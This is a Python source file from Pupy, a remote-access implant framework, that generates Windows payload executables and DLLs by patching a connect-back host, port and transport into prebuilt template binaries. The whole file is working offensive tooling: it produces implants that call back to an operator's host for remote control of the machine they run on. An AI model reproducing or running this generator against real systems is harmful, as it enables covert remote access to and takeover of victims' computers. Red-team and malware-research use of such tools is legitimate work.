# -*- coding: UTF8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms

import argparse
import sys
import os.path
from pupylib.utils.network import get_local_ip
from network.conf import transports

def get_edit_pupyx86_dll(host, ip, transport):
	return get_edit_binary(os.path.join("payload_templates","pupyx86.dll"), host, ip, transport)

def get_edit_pupyx64_dll(host, ip, transport):
	return get_edit_binary(os.path.join("payload_templates","pupyx64.dll"), host, ip, transport)

def get_edit_pupyx86_exe(host, ip, transport):
	return get_edit_binary(os.path.join("payload_templates","pupyx86.exe"), host, ip, transport)

def get_edit_pupyx64_exe(host, ip, transport):
	return get_edit_binary(os.path.join("payload_templates","pupyx64.exe"), host, ip, transport)

def get_edit_binary(path, host, port, transport, offline_script=""):
	binary=b""
	with open(path, 'rb') as f:
		binary=f.read()
	i=0
	offsets=[]
	while True:
		i=binary.find("####---PUPY_CONFIG_COMES_HERE---####\n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", i+1)
		if i==-1:
			break
		offsets.append(i)

	if not offsets:
		raise Exception("Error: the offset to edit the config have not been found")
	elif len(offsets)!=1:
		raise Exception("Error: multiple offsets to edit the config have been found")

	new_conf="HOST=\"%s:%s\"\nTRANSPORT=%s\n%s\n\x00\x00\x00\x00\x00\x00\x00\x00"%(host, port, repr(transport), offline_script)
	if len(new_conf)>4092:
		raise Exception("Error: config too long")
	binary=binary[0:offsets[0]]+new_conf+binary[offsets[0]+len(new_conf):]
	return binary


if __name__=="__main__":
	parser = argparse.ArgumentParser(description='Process some integers.')
	parser.add_argument('-t', '--type', default='exe_x86', choices=['exe_x86','exe_x64','dll_x86','dll_x64'], help="(default: exe_x86)")
	parser.add_argument('-o', '--output', help="output path")
	parser.add_argument('-p', '--port', type=int, default=443, help="connect back ip (default:443)")
	parser.add_argument('--transport', choices=[x for x in transports.iterkeys()], default='tcp_ssl', help="the transport to use ! (the server needs to be configured with the same transport) ")
	parser.add_argument('host', nargs='*', help="connect back host")
	args=parser.parse_args()
	myhost=None
	if not args.host:
		myip=get_local_ip()
		if not myip:
			sys.exit("[-] couldn't find your local IP. You must precise an ip or a fqdn manually")
		myhost=myip
	else:
		myhost=args.host[0]
	
	outpath=None
	if args.type=="exe_x86":
		binary=get_edit_pupyx86_exe(myhost, args.port, args.transport)
		outpath="pupyx86.exe"
		if args.output:
			outpath=args.output
		with open(outpath, 'wb') as w:
			w.write(binary)
	elif args.type=="exe_x64":
		binary=get_edit_pupyx64_exe(myhost, args.port, args.transport)
		outpath="pupyx64.exe"
		if args.output:
			outpath=args.output
		with open(outpath, 'wb') as w:
			w.write(binary)
	elif args.type=="dll_x64":
		binary=get_edit_pupyx64_dll(myhost, args.port, args.transport)
		outpath="pupyx64.dll"
		if args.output:
			outpath=args.output
		with open(outpath, 'wb') as w:
			w.write(binary)
	elif args.type=="dll_x86":
		binary=get_edit_pupyx86_dll(myhost, args.port, args.transport)
		outpath="pupyx86.dll"
		if args.output:
			outpath=args.output
		with open(outpath, 'wb') as w:
			w.write(binary)
	else:
		exit("Type %s is invalid."%(args.type))
	print "binary generated to %s with HOST=%s:%s and TRANSPORT=%s"%(outpath, myhost, args.port, args.transport)






